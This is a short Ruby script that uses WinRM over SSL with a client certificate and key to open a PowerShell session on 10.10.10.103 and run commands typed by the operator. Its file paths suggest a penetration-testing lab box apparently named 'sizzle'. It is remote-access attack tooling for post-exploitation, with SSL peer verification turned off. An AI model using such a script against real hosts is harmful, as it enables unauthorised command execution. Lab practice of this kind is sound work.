#!/usr/bin/ruby
require 'winrm'
opts = { 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: '/home/yuschumacher/Documents/GitHub/Pen-Test-Reports/sizzle/certnew.cer',
  client_key: '/home/yuschumacher/Documents/GitHub/Pen-Test-Reports/sizzle/request.key',
  :no_ssl_peer_verification => true
}
conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
  output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
  print (output.output.chomp)
  command = gets
  output = shell.run(command) do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
